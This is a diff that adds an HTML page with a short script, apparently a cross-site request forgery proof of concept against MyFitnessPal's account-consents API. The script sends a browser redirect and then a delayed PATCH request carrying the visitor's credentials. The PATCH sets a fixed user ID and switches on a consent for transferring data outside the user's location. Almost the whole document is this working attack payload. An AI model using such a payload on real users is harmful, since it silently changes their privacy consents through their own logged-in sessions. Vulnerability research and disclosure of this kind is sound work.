@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// 目标API地址
+const apiUrl = 'https://www.myfitnesspal.com/api/idm/user-with-consents';
+
+// 1. GET请求：通过window.location.href实现强制页面跳转
+window.location.href = apiUrl;
+
+// 2. 延迟2秒（2000毫秒）执行PATCH请求，使用固定domainUserId=1234567890
+setTimeout(() => {
+  const domainUserId = "1234567890";
+  const xhrPatch = new XMLHttpRequest();
+  xhrPatch.open('PATCH', apiUrl, true);
+  xhrPatch.withCredentials = true;
+  xhrPatch.setRequestHeader('Content-Type', 'application/json');
+  const requestBody = {
+    "account_links": [
+      {
+        "domain":"MFP",
+        "domainUserId": domainUserId,
+        "consent_matrix_version":"nc.20250403.01",
+        "consents":{"transfer_outside_location":true},
+        "ad_consents_last_seen":"2026-01-23T11:23:23.942Z"
+      }
+    ]
+  };
+  xhrPatch.send(JSON.stringify(requestBody));
+}, 2000); // 延迟2000毫秒（2秒）执行PATCH逻辑
+</script>
+</body>
+</html>
